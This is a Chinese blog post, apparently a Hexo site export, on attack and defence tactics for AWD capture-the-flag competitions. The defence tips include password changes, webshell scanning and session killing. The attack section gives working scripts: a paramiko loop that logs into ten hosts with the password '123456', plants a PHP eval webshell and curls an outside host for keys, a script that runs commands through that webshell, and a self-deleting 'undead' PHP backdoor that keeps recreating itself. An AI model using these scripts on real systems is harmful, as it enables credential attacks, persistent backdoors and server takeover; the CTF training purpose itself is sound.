deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/24/AWD%E6%94%BB%E9%98%B2/"/>
      <url>/2023/10/24/AWD%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD攻防"><a href="#AWD攻防" class="headerlink" title="AWD攻防"></a>AWD攻防</h1><p>基本防守策略</p><p>1、改用户密码和服务密码</p><p>1）改linux用户密码：</p><p>#passwd</p><p>如果有权限就删除用户：</p><p>#userdel -r [用户名]</p><p>2）改mysql密码：</p><p>#update mysql.user set password&#x3D;password(‘密码’) where user&#x3D;’root’;</p><p>删除匿名用户：</p><p>#delete from mysql.user where user&#x3D;’ ‘;</p><p>刷新配置：</p><p>#flush privileges;</p><p>3）改网站后台密码</p><p>从网站页面或者源码或者御剑工具找到后台页面，然后尝试弱口令登入后改管理员密码。</p><p>2、Web防护</p><p>1）将网站目录打包成tar</p><p>#tar -cvf [打包后的文件名.tar] [要打包的文件名]</p><p>2）用ssh或ftp将打包文件拉到本地</p><p>ssh法:</p><p>#scp 用户名@IP地址:要下载的文件路径 存放路径</p><p>如：scp <a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x36;&#x2e;&#56;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x36;&#x2e;&#56;</a>:&#x2F;root&#x2F;flag.txt &#x2F;root&#x2F;</p><p>ftp法：</p><p>#ftp [IP地址]</p><p>#get [文件名]</p><p>或者用ftp登入软件下载</p><p>3）将压缩包解压，然后拉到D盾里面扫描木马文件</p><p>4）用ssh控制或ftp控制服务器将木马文件删除</p><p>3、关闭shell连接进程</p><p>1）查看正在连接的进程</p><p>#who</p><p>2）关闭连接进程</p><p>#pkill -kill -t pts&#x2F;进程号</p><p>4、网站守护</p><p>1）查看新增文件，删掉</p><h1 id="find-cmin-30"><a href="#find-cmin-30" class="headerlink" title="find .&#x2F; -cmin -30"></a>find .&#x2F; -cmin -30</h1><p>2）删除不死码</p><h1 id="vim-killshell-sh"><a href="#vim-killshell-sh" class="headerlink" title="vim killshell.sh"></a>vim killshell.sh</h1><h1 id="chmod-777-killshell-sh"><a href="#chmod-777-killshell-sh" class="headerlink" title="chmod 777 killshell.sh"></a>chmod 777 killshell.sh</h1><h1 id="nohup-killshell-sh"><a href="#nohup-killshell-sh" class="headerlink" title="nohup .&#x2F;killshell.sh &amp;"></a>nohup .&#x2F;killshell.sh &amp;</h1><hr><p>#!&#x2F;bin&#x2F;bash</p><p>while true</p><p>do</p><p>rm -rf xxx.php</p><p>done</p><hr><p>3）发现网站页面有漏洞</p><h1 id="echo-xxx-php"><a href="#echo-xxx-php" class="headerlink" title="echo  &gt; xxx.php"></a>echo  &gt; xxx.php</h1><p>PS：平台root用户可能是弱口令toor密码，或者存在内核溢出提权。</p><p>chmod 777 payload</p><p>.&#x2F;payload</p><p>网神杯奇安信平台溢出提权，4.4.0-31-generic Ubuntu 内核。</p><p>rm -rf &#x2F;bin&#x2F;curl</p><p>基本攻击策略</p><p>1、弱口令攻击</p><p>批量用户登入修改密码并写入webshell且获取flag值。</p><p>ls &#x2F;home&#x2F;</p><p>python3 ssh.py</p><hr><p>#!&#x2F;usr&#x2F;bin&#x2F;env python</p><p>#-<em>- coding:utf-8 -</em>-</p><p>import paramiko</p><p>for i in [1,2,3,4,5,6,7,8,9,10]:</p><p>try:</p><p>host &#x3D; “4.4.”+str(i)+”.100”</p><p>s&#x3D;paramiko.SSHClient()</p><p>s.set_missing_host_key_policy(paramiko.AutoAddPolicy())</p><p>s.connect(hostname&#x3D;host,port&#x3D;22,username&#x3D;’user1’,password&#x3D;’123456’)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(‘passwd\n’)</p><p>stdin.write(“123456\<a href="mailto:&#x6e;&#x50;&#x61;&#x73;&#x73;&#x40;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#109;">&#x6e;&#x50;&#x61;&#x73;&#x73;&#x40;&#49;&#x32;&#51;&#x2e;&#99;&#111;&#109;</a>\<a href="mailto:&#x6e;&#80;&#97;&#x73;&#x73;&#x40;&#49;&#50;&#51;&#46;&#x63;&#x6f;&#109;">&#x6e;&#80;&#97;&#x73;&#x73;&#x40;&#49;&#50;&#51;&#46;&#x63;&#x6f;&#109;</a>\n”)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(“echo ‘<?php eval($_POST[cmd]);?>‘&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;.zack.php”)</p><p>stdin,stdout,stderr &#x3D; s.exec_command(‘curl <a href="http://192.168.245.250/getkey'">http://192.168.245.250/getkey'</a>)</p><p>print(host+’:’+stdout.read().decode(‘utf-8’))</p><p>s.close()</p><p>except:</p><p>print(host+’:Fails!’)</p><hr><p>2、批量调用webshell获取flag</p><p>用D盾扫描自己的网站木马，根据木马写脚本。</p><p>python3 web.py</p><hr><p>#!&#x2F;usr&#x2F;bin&#x2F;env python</p><p>#-<em>- coding:utf-8 -</em>-</p><p>import requests</p><p>for i in [1,2,3,4,5,6,7,8,9,10]:</p><p>try:</p><p>url&#x3D;”<a href="http://4.4."+str(i)+".100:"+str(1005)+"/.zack.php">http://4.4.&quot;+str(i)+&quot;.100:&quot;+str(1005)+&quot;/.zack.php</a>“</p><p>result&#x3D;requests.post(url,data&#x3D;{‘cmd’:”system(‘curl <a href="http://192.168.245.250/getkey'">http://192.168.245.250/getkey');"},timeout=2</a>;%22%7d,timeout&#x3D;2))</p><p>print(url+’–&gt;’+result.text)</p><p>except:</p><p>print(url+’–&gt;Fails!’)</p><hr><p>3、不死码种植</p><p>将不死码上传网站目录，访问不死码后在当前目录生成.zack.php后门webshell。</p><hr><?phpset_time_limit(0);#1表示忽略与客户端断开连接，继续执行脚本ignore_user_abort(1);#执行完后删除自身unlink(__FILE__);while (1) {$content = '<?php @eval($_POST[zack]);?><p>‘;</p><p>file_put_contents(“.zack.php”, $content);</p><p>usleep(500);  #暂停0.5秒钟</p><p>}</p><p>?&gt;</p><hr><p>杀死不死马的方法，查看不死马的进程ID：</p><h1 id="top-grep-httpd"><a href="#top-grep-httpd" class="headerlink" title="top | grep httpd"></a>top | grep httpd</h1><p>chmod 777 kill.sh</p><p>nohup .&#x2F;kill.sh &amp;</p><p>查到ID为 11198 ，根据ID号和webshell名写.sh脚本。</p><h1 id="vim-kill-sh"><a href="#vim-kill-sh" class="headerlink" title="vim kill.sh"></a>vim kill.sh</h1><hr><p>#!&#x2F;bin&#x2F;bash</p><p>while true</p><p>do</p><p>kill -9 11198</p><p>rm -rf .shell.php</p><p>done</p><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
